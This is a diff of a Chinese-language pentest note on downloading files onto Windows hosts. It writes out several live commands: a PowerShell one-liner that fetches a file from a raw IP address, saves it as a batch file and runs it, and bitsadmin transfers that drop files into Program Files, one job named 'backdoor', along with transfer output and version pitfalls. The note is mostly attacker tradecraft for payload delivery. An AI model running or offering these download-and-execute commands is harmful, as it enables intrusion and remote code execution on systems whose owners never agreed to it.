@@ -13,7 +13,7 @@ win2003，winXP不支持
 
 踩坑：
 
-- Powershell 版本大于2.0时 在连接Powershell命令时 **空格** 替换了 ;
+- Powershell 版本大于`2.0`时 在连接Powershell命令时 **空格** 替换了 `;`
 - Powershell 版本低于或等于2.0时 `DownloadFile()`函数不支持自定义路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)
 
 powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', 'test.bat');start-process 'test.bat'
@@ -78,9 +78,11 @@ bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\a
 
 bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt c:\autoruns.bat bitsadmin /RESUME 1 bitsadmin /complete 1
 
-- ```cmd
-  bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt C:\Program Files (x86)\1.bat bitsadmin /RESUME 1 bitsadmin /complete 1
-  ```
+```bash
+bitsadmin /create 1 bitsadmin /addfile 1 http://47.92.194.173/test.txt C:\Program Files (x86)\1.bat bitsadmin /RESUME 1 bitsadmin /complete 1
+```
+
+
 
 bitsadmin /rawreturn /transfer getfile http://47.92.194.173/test.txt C:\Program Files\1.bat
 
@@ -90,9 +92,6 @@ bitsadmin /transfer myDownLoadJob /download /priority normal "http://47.92.194.1
 
 ```cmd
 bitsadmin /transfer backdoor http://47.92.194.173/test.txt C:\Program Files\1.bat
-```
-
-
 
 DISPLAY: '任务名' TYPE: DOWNLOAD STATE: TRANSFERRED PRIORITY: NORMAL FILES: 1 / 1 BYTES: 11392 / 11392 (100%) Transfer complete
 
@@ -107,6 +106,11 @@ bitsadmin 不像CURL WGET 这类工具那样能用来下载HTML页面。
 bitsadmin 权限问题待解决
 
 bitsadmin已经在win7 win10 win2008 不可用
+```
+
+
+
+
 
 
 
